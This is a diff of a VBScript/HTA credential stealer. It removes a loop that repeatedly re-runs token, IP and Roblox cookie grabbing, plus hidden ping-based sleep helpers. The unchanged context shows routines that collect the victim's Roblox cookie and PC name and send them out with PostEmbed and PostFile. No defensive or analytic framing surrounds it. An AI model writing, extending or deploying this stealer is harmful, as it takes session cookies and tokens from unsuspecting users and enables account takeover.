@@ -20,16 +20,6 @@ Call GrabTokens
 Call IP
 Call GrabRoblox
 
-' --- Re-run grab chain 8x (every 10 min) ---
-Dim runCount
-For runCount = 1 To 8
-    Call PostEmbed(":repeat: Re-grab " & runCount & "/8", "PC: " & PC & " | User: " & USER, 3447003)
-    Call GrabTokens
-    Call IP
-    Call GrabRoblox
-    If runCount < 8 Then Call SleepMinutes(10)
-Next
-
 window.close()
 
 ' --- IP Function ---
@@ -95,16 +85,6 @@ Sub GrabRoblox()
 
     PostEmbed "Roblox Cookie", "Size: " & Len(cookie) & " | PC: " & PC, 65280
     PostFile "cookie.txt", cookie
-End Sub
-
-' --- Sleep Functions ---
-Sub SleepSeconds(s)
-    Dim cmd : cmd = "cmd /c ping -n " & (s + 1) & " 127.0.0.1 > nul"
-    sh.Run cmd, 0, True
-End Sub
-
-Sub SleepMinutes(m)
-    Call SleepSeconds(m * 60)
 End Sub
 
 ' --- GrabTokens ---
